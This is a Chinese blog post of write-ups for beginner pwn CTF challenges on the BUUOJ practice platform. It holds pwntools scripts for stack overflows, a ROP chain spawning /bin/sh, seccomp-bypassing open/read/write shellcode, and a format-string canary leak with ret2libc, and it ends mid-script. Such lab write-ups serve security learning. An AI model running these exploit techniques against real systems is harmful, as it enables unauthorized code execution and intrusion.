@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html><head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>PWN简单题题解 - Blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="picoctf_2018_buffer overflow 2 from pwn import * from LibcSearcher import* # context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;) context.log_level = &#39;debug&#39; elf = ELF(&#39;./bin/PicoCTF_2018_buffer_overflow_2&#39;) p = remote(&#39;node4.buuoj.cn&#39;, 28842) # elf win = elf.symbols[&#39;win&#39;] main_addr = elf.symbols[&#39;main&#39;] a1 = 0x0DEADBEEF a2 = 0x0DEADC0DE print(p.recvline()) payload = b&#39;a&#39; * 0x6c &#43; p32(0) &#43; p32(win) &#43; p32(main_addr) &#43; p32(a1) &#43; p32(a2) p.sendline(payload) p.interactive() 2023.6.4 jarvisoj_test_your_memory 这个题注意要最后返回到main函数，使得程序正常结束，不然程序崩溃不会回显flag
+from pwn import * from LibcSearcher import* # context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;) context." />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="PWN简单题题解" />
+<meta property="og:description" content="picoctf_2018_buffer overflow 2 from pwn import * from LibcSearcher import* # context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;) context.log_level = &#39;debug&#39; elf = ELF(&#39;./bin/PicoCTF_2018_buffer_overflow_2&#39;) p = remote(&#39;node4.buuoj.cn&#39;, 28842) # elf win = elf.symbols[&#39;win&#39;] main_addr = elf.symbols[&#39;main&#39;] a1 = 0x0DEADBEEF a2 = 0x0DEADC0DE print(p.recvline()) payload = b&#39;a&#39; * 0x6c &#43; p32(0) &#43; p32(win) &#43; p32(main_addr) &#43; p32(a1) &#43; p32(a2) p.sendline(payload) p.interactive() 2023.6.4 jarvisoj_test_your_memory 这个题注意要最后返回到main函数，使得程序正常结束，不然程序崩溃不会回显flag
+from pwn import * from LibcSearcher import* # context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;) context." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E5%88%B7%E9%A2%98/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-06-22T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-06-22T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="PWN简单题题解"/>
+<meta name="twitter:description" content="picoctf_2018_buffer overflow 2 from pwn import * from LibcSearcher import* # context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;) context.log_level = &#39;debug&#39; elf = ELF(&#39;./bin/PicoCTF_2018_buffer_overflow_2&#39;) p = remote(&#39;node4.buuoj.cn&#39;, 28842) # elf win = elf.symbols[&#39;win&#39;] main_addr = elf.symbols[&#39;main&#39;] a1 = 0x0DEADBEEF a2 = 0x0DEADC0DE print(p.recvline()) payload = b&#39;a&#39; * 0x6c &#43; p32(0) &#43; p32(win) &#43; p32(main_addr) &#43; p32(a1) &#43; p32(a2) p.sendline(payload) p.interactive() 2023.6.4 jarvisoj_test_your_memory 这个题注意要最后返回到main函数，使得程序正常结束，不然程序崩溃不会回显flag
+from pwn import * from LibcSearcher import* # context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;) context."/>
+
+	
+        <link href="https://example.com/css/fonts.11a1877508139eac0b5b4852ceb110c35641b3533321e66e39149e901ed5756b.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="https://example.com/css/main.d902908ac6e0fab67957de5db5aea1b6455b19ae2ca98eac4c95a4a0fdc02238.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://example.com/css/dark.c95c5dcf5f32f8b67bd36f7dab66680e068fce2b303087294114aabf7a7c080b.css" media="(prefers-color-scheme: dark)"  />
+	
+
+	
+	
+
+	
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="https://example.com">Blog</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/categories">Categories</a>
+		
+		<a href="/tags">Tags</a>
+		
+		<a href="/about">About</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">PWN简单题题解</h1>
+			<div class="meta">Posted on Jun 22, 2023</div>
+		</div>
+		
+
+		<section class="body">
+			<h2 id="picoctf_2018_buffer-overflow-2">picoctf_2018_buffer overflow 2</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span><span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;)</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./bin/PicoCTF_2018_buffer_overflow_2&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;node4.buuoj.cn&#39;</span>, <span style="color:#ae81ff">28842</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># elf</span>
+</span></span><span style="display:flex;"><span>win <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;win&#39;</span>]
+</span></span><span style="display:flex;"><span>main_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]
+</span></span><span style="display:flex;"><span>a1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0DEADBEEF</span>
+</span></span><span style="display:flex;"><span>a2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0DEADC0DE</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x6c</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(win) <span style="color:#f92672">+</span> p32(main_addr) <span style="color:#f92672">+</span> p32(a1) <span style="color:#f92672">+</span> p32(a2)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="202364-jarvisoj_test_your_memory">2023.6.4 jarvisoj_test_your_memory</h2>
+<p>这个题注意要最后返回到main函数，使得程序正常结束，不然程序崩溃不会回显flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span><span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;)</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./bin/memory&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;node4.buuoj.cn&#39;</span>, <span style="color:#ae81ff">29968</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># elf</span>
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
+</span></span><span style="display:flex;"><span>catflag <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080487E0</span>
+</span></span><span style="display:flex;"><span>main_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x13</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(system) <span style="color:#f92672">+</span> p32(main_addr) <span style="color:#f92672">+</span> p32(catflag)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="2023年5月15日-inndy_rop">2023年5月15日 inndy_rop</h2>
+<p>这个题是静态编译，怎么看出来的呢，就是特别ida看起来特复杂，就是静态编译的结果。静态编译就不会调用libc中的东西，所以我们也不存在泄露版本利用libc的函数了。
+所以使用ROPgadget的一个功能，直接利用程序中的片段拼凑rop链。
+<code>ROPgadget --binary rop --ropchain</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;node4.buuoj.cn&#39;</span>, <span style="color:#ae81ff">25107</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0xc</span><span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0806ecda</span>) <span style="color:#75715e"># pop edx ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080ea060</span>) <span style="color:#75715e"># @ .data</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080b8016</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin&#39;</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0805466b</span>) <span style="color:#75715e"># mov dword ptr [edx], eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0806ecda</span>) <span style="color:#75715e"># pop edx ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080ea064</span>) <span style="color:#75715e"># @ .data + 4</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080b8016</span>) <span style="color:#75715e"># pop eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;//sh&#39;</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0805466b</span>) <span style="color:#75715e"># mov dword ptr [edx], eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0806ecda</span>) <span style="color:#75715e"># pop edx ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080ea068</span>) <span style="color:#75715e"># @ .data + 8</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080492d3</span>) <span style="color:#75715e"># xor eax, eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0805466b</span>) <span style="color:#75715e"># mov dword ptr [edx], eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080481c9</span>) <span style="color:#75715e"># pop ebx ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080ea060</span>) <span style="color:#75715e"># @ .data</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080de769</span>) <span style="color:#75715e"># pop ecx ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080ea068</span>) <span style="color:#75715e"># @ .data + 8</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0806ecda</span>) <span style="color:#75715e"># pop edx ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080ea068</span>) <span style="color:#75715e"># @ .data + 8</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x080492d3</span>) <span style="color:#75715e"># xor eax, eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0807a66f</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0807a66f</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0807a66f</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0807a66f</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0807a66f</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0807a66f</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0807a66f</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0807a66f</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0807a66f</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0807a66f</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0807a66f</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0806c943</span>) <span style="color:#75715e"># int 0x80</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="mrctf2020_shellcode">mrctf2020_shellcode</h2>
+<p>这个题的点是注意环境的配置
+<code>context(arch = 'amd64', os = 'linux', log_level = 'debug')</code></p>
+<h2 id="pwnable_orw">pwnable_orw</h2>
+<ul>
+<li>这个题有点意思</li>
+<li>在 orw_seccomp 函数中有个 prctl 函数，这个函数是内核中的一种安全机制，他可以限制程序使用的系统调用，意思是我们不能劫持程序流去执行 execve 程序调用了。
+<ul>
+<li>(1). PR_SET_SECCOMP (22)：当第一个参数是 PR_SET_SECCOMP, 第二个参数 argv2为1的时候，表示允许的系统调用有 read，write，exit 和 sigereturn；当 argv 等于2的时候，表示允许的系统调用由 argv3指向 sock_fprog 结构体定义，该结构体成员指向的 sock_filter 可以定义过滤任意系统调用和系统调用参数。</li>
+<li>(2). PR_SET_NO_NEWPRIVS (38): prctl (38,1,0,0,0)表示禁用系统调用 execve ()函数，同时，这个选项可以通过 fork ()函数和 clone ()函数继承给子进程。</li>
+</ul>
+</li>
+<li><img src="https://gitee.com/juhuahua/chart-bed/raw/master/20230514152056.png" alt="image.png"></li>
+<li>我们可以看到这两句程序表示限制了 execve 系统调用，只留给 v1 指向的系统调用，sys_open，sys_read，sys_write。</li>
+<li>结合主函数直接执行了我们的输入，所以我们构造打开 flag、读 flag 和写 flag 的三段 shellcode 然后直接输入就可以得到 flag 了。</li>
+<li>可以直接通过 shellcraft 构建对应的 shellcode</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;node4.buuoj.cn&#39;</span>, <span style="color:#ae81ff">25953</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> shellcraft<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;/flag&#39;</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> shellcraft<span style="color:#f92672">.</span>read(<span style="color:#e6db74">&#39;eax&#39;</span>,<span style="color:#e6db74">&#39;esp&#39;</span>,<span style="color:#ae81ff">100</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> shellcraft<span style="color:#f92672">.</span>write(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#39;esp&#39;</span>,<span style="color:#ae81ff">100</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> asm(shellcode)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(shellcode)
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># p.interactive()</span>
+</span></span></code></pre></div><p>三个系统调用的汇编代码如下所示：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>char<span style="color:#f92672">*</span>file<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;flag&#39;</span>;
+</span></span><span style="display:flex;"><span>sys_open(file,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>xor ecx,ecx;
+</span></span><span style="display:flex;"><span>mov eax,<span style="color:#ae81ff">0x5</span>;     <span style="color:#75715e"># eax = sys_open</span>
+</span></span><span style="display:flex;"><span>push ecx;        <span style="color:#75715e"># 字符串结尾&#34;\00&#34;</span>
+</span></span><span style="display:flex;"><span>push <span style="color:#ae81ff">0x67616c66</span>; <span style="color:#75715e"># &#34;flag字符串的16进制表示，由于小端序，所以是从右往左&#34;</span>
+</span></span><span style="display:flex;"><span>mov ebx,esp;     <span style="color:#75715e"># ebx = const char __user *filename</span>
+</span></span><span style="display:flex;"><span>xor edx,edx;     <span style="color:#75715e"># edx  = int mode 设定权限的</span>
+</span></span><span style="display:flex;"><span>int <span style="color:#ae81ff">0x80</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sys_read(<span style="color:#ae81ff">3</span>,file,<span style="color:#ae81ff">0x30</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mov eax,<span style="color:#ae81ff">0x3</span>; <span style="color:#75715e"># eax = sys_read</span>
+</span></span><span style="display:flex;"><span>mov ecx,ebx; <span style="color:#75715e"># ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”</span>
+</span></span><span style="display:flex;"><span>mov ebx,<span style="color:#ae81ff">0x3</span>; <span style="color:#75715e"># ebx = unsigned int fd = 3 文件描述符</span>
+</span></span><span style="display:flex;"><span>mov dl,<span style="color:#ae81ff">0x30</span>; <span style="color:#75715e"># edx = size_t count 对应字节数</span>
+</span></span><span style="display:flex;"><span>int <span style="color:#ae81ff">0x80</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sys_write(<span style="color:#ae81ff">1</span>,file,<span style="color:#ae81ff">0x30</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mov eax,<span style="color:#ae81ff">0x4</span>; <span style="color:#75715e"># eax = sys_write</span>
+</span></span><span style="display:flex;"><span>mov bl,<span style="color:#ae81ff">0x1</span>;  <span style="color:#75715e"># ebx = unsigned int fd = 1</span>
+</span></span><span style="display:flex;"><span>mov edx,<span style="color:#ae81ff">0x30</span> <span style="color:#75715e"># edx = size_t count</span>
+</span></span><span style="display:flex;"><span>int <span style="color:#ae81ff">0x80</span>;
+</span></span></code></pre></div><h2 id="bjdctf_2020_babyrop2">bjdctf_2020_babyrop2</h2>
+<ul>
+<li>这个题有 carry，通过格式化字符串漏洞泄露 carry，carry 的位置一般在 ebp 的上面</li>
+<li>然后按照 ret2libc 进行</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;bjdctf_2020_babyrop2&#39;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.23.so&#39;</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;node4.buuoj.cn&#39;</span>, <span style="color:#ae81ff">27525</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># elf</span>
+</span></span><span style="display:flex;"><span>puts_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>puts_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>vuln <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;vuln&#39;</span>]
+</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#gadgets</span>
+</span></span><span style="display:flex;"><span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400993</span>
+</span></span><span style="display:flex;"><span>rsi_r15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4006b1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#get carry</span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%7$p&#39;</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;0x&#34;</span>)
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">16</span>),<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>print(hex(canary))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#leak libcbase</span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> p64(canary) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> p64(rdi) <span style="color:#f92672">+</span> p64(puts_got) <span style="color:#f92672">+</span> p64(puts_plt) <span style="color:#f92672">+</span> p64(vuln)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>puts_addr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>print(hex(puts_addr))
+</span></span><span style="display:flex;"><span>
